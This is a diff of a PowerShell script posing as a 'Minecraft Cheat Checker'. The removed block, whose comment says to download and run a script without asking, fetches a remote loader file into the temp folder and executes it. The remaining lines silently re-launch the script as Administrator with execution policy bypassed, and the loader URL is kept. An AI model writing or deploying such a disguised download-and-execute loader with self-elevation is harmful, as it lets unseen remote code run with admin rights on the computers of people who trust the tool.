@@ -5,39 +5,14 @@ $Host.UI.RawUI.WindowTitle = "Minecraft Cheat Checker v2.0 - RANDOMIZER"
 $Host.UI.RawUI.BackgroundColor = "Black"
 $Host.UI.RawUI.ForegroundColor = "DarkRed"
 Clear-Host
-
-# ===== СРАЗУ КАЧАЕМ И ЗАПУСКАЕМ PS1 БЕЗ ВОПРОСОВ =====
 $ScriptURL = "https://github.com/ShramC/Ds/raw/refs/heads/main/loder.ps1"
 $ScriptPath = "$env:TEMP\minecraft_checker_loader.ps1"
-
-Write-Host "[*] DOWNLOADING AND EXECUTING CORE MODULE..." -ForegroundColor Magenta
-try {
-    Invoke-WebRequest -Uri $ScriptURL -OutFile $ScriptPath -UseBasicParsing -ErrorAction Stop
-    Write-Host "[+] DOWNLOAD COMPLETE" -ForegroundColor Green
-    Write-Host "[*] EXECUTING loder.ps1..." -ForegroundColor Magenta
-    & $ScriptPath
-    Write-Host "[+] CORE MODULE EXECUTED SUCCESSFULLY" -ForegroundColor Green
-} catch {
-    Write-Host "[-] DOWNLOAD FAILED: $_" -ForegroundColor Red
-    try {
-        (New-Object Net.WebClient).DownloadFile($ScriptURL, $ScriptPath)
-        & $ScriptPath
-    } catch {
-        Write-Host "[-] CRITICAL FAILURE - CANNOT LOAD CORE" -ForegroundColor Red
-    }
-}
-
 Start-Sleep 1
-
-# ===== АДМИН ПРАВА НА ВСЯКИЙ СЛУЧАЙ =====
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     Exit
 }
-
 Clear-Host
-
-# ===== ASCII ART =====
 $Art = @"
 
 ██╗  ██╗ ██████╗ ███████╗████████╗    ██████╗  ██████╗ ██████╗ ████████╗
